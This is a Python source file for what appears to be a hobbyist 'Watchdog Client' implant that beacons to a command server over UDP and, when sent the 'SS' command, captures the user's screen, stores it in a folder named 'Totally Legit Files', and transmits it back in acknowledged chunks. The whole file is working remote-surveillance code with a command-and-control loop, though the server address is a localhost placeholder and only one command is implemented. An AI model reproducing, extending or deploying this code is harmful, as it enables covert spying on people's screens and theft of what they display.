import pyautogui
from pathlib import Path
from datetime import datetime
import os
import socket
import struct
import io
from PIL import Image
import time
import subprocess


SERVER_IP = "127.0.0.1"
PORT = 7777 #77 Carson Hocevar
CHUNK_SIZE = 1400  #Max size is 1500, go a little lower to be safe
FOLDER_PATH = Path("C:/Totally Legit Files") #Path where screenshots will be saved on the client device
SOCK = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def screeenshot():

    #Check if FOLDER_PATH exists, if not, make
    FOLDER_PATH.mkdir(parents=False, exist_ok=True)

    #Set screenshot path and name
    now = datetime.now()
    file_name = "screenshot" + now.strftime('%Y-%m-%d_%H-%M-%S') +".png"
    file_path = FOLDER_PATH / file_name

    #Take screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save(file_path)
    return screenshot

def send_screenshot(screenshot):

    #Set timeout to reasonable value
    SOCK.settimeout(.4)

    #Compress ss with pillow
    print(f"Loading and optimizing screenshot")
    if screenshot.mode in ("RGBA", "P"):
        screenshot = screenshot.convert("RGB")
    buffer = io.BytesIO()
    screenshot.save(buffer, format="JPEG", quality=85, optimize=True)
    image_bytes = buffer.getvalue()
    total_bytes = len(image_bytes)
    print(f"Compressed size: {total_bytes} bytes, Ready for transmission.")

    #Start the byte pointer and packet number at 0
    byte_pointer = 0
    pack_num = 0

    #Loop to send packets until done
    while True:
        chunk = image_bytes[byte_pointer:byte_pointer + CHUNK_SIZE]
        byte_pointer += CHUNK_SIZE
        eof = 1 if byte_pointer >= total_bytes else 0
        header = struct.pack("!IB", pack_num, eof)
        packet = header + chunk

        #Loop to send this specific packet until it's confirmed
        while True:
            try:
                SOCK.sendto(packet, (SERVER_IP, PORT))
            
                # Listen for acknowledgement
                ack_packet, _ = SOCK.recvfrom(10)
                ack_seq, = struct.unpack("!I", ack_packet)
            
                if ack_seq == pack_num:
                    # Confirmed, move to next packet
                    break
            except socket.timeout:
                # Didn't survive the journey
                pass
            
        if eof:
            print(f"Photo sent successfully using {pack_num + 1} UDP packets.")
            break
        
        pack_num += 1

def heartbeat():

    

    while True:
        #set timeout longer to accomodate heartbeat
        SOCK.settimeout(2)

        SOCK.sendto(b"PING", (SERVER_IP, PORT))

        try:
            command, _ = SOCK.recvfrom(1024)
            cmd_str = command.decode()

            if cmd_str != "IDLE":
                match cmd_str:
                    case "SS":
                        SOCK.sendto(b"SS", (SERVER_IP, PORT))
                        send_screenshot(screeenshot())
        except socket.timeout:
            pass

        time.sleep(5)

#shitty main, fix later
def main():
    print("Watchdog Client V0.2, type HELP for help\n")
    while True:
        heartbeat()
        
#RUNGAUURRRRDDDD
if __name__ == "__main__":
    main()